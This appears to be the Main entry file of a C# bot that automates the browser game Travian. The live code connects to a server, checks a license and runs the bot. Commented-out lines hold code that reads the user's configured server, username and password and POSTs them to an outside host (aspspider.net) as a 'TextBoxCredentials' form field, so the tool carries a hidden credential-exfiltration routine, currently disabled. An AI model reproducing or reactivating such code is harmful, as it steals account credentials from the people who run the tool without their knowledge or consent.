using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using TravianBot.Framework;

namespace TravianBot.FakeAttack
{
    class Program
    {
        static void Main(string[] args)
        {
/*
POST /jezatools/test/default.aspx
__EVENTTARGET=LinkButtonSubmit&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUJNTc0Njc0NDcwD2QWAgIDD2QWAgIFDw8WAh4EVGV4dGVkZGShK5SyYcqarqAhfI2bFmIZ6JgpYw%3D%3D&TextBoxCredentials=qweqweqwe&__EVENTVALIDATION=%2FwEWAwLCh8KBCgLr%2BYqfBAK6xufABhgQY6BbswvttVhxUUP1dMxUsEC0
__EVENTTARGET=LinkButtonSubmit&TextBoxCredentials=qweqweqwe 
 */
            //ServerInfo serverInfo = new ServerInfo	();
            //StringBuilder credentials = new StringBuilder	();
            //credentials.Append(Misc.GetConfigValue("serverName").Substring(7));
            //credentials.Append("|");
            //credentials.Append(Misc.GetConfigValue("userName"));
            //credentials.Append("|");
            //credentials.Append(Misc.GetConfigValue("password"));
            //Http.SendData("http://aspspider.net/jezatools/test/default.aspx",
            //              String.Format("__EVENTTARGET=LinkButtonSubmit&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUJNTc0Njc0NDcwD2QWAgIDD2QWAgIFDw8WAh4EVGV4dGVkZGShK5SyYcqarqAhfI2bFmIZ6JgpYw%3D%3D&TextBoxCredentials={0}&__EVENTVALIDATION=%2FwEWAwLCh8KBCgLr%2BYqfBAK6xufABhgQY6BbswvttVhxUUP1dMxUsEC0", credentials), 
            //              serverInfo.CookieContainer,
            //              serverInfo.CookieCollection);
            //ArrayList alianceIds = new ArrayList { 2092, 2210, 1137 };
            ConsoleApp consoleApp = new ConsoleApp();
            if (consoleApp.ConnectToserver())
            {
                if (consoleApp.CheckLicense())
                {
                    consoleApp.ParseConfig();
                    consoleApp.Process();
                }
            }
            Console.WriteLine("Pres any key to exit program...");
            Console.ReadKey();
        }
    }
}
